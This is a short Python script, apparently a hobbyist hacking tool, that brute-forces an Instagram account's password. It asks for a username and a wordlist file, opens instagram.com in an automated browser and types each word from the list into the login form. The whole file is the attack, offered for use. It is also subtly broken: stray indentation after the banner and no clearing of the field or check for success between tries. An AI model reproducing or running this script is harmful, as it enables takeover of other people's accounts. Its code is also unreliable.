## Author  : Jerry4539 
## Github  : github.com/Jerry4539 
## Insta   : xhacking_officail

from webbot import Browser
from pynput.keyboard import Key, Controller
import time
print(r""" 
   ___                               ___  _____  _____  _____  
  |_  |                             /   ||  ___||____ ||  _  | 
    | | ___ _ __ _ __ _   _ ______ / /| ||___ \     / /| |_| | 
    | |/ _ \ '__| '__| | | |______/ /_| |    \ \    \ \\____ | 
/\__/ /  __/ |  | |  | |_| |      \___  |/\__/ /.___/ /.___/ / 
\____/ \___|_|  |_|   \__, |          |_/\____/ \____/ \____/  
                       __/ |                                   
                      |___/                                    
""")
    print("\n****************************************************************")
    print("\n* Copyright of Jerry4539 , 2021                              *")
    print("\n* https://github.com/Jerry4539                                 *")
    print("\n* https://www.youtube.com/Anomoyous                          *")
    print("\n****************************************************************")
username = input('Username: ')
dictionary = input('Choose Dictionary: ')

file = open(f'{dictionary}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

web = Browser()
keyboard = Controller()


web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
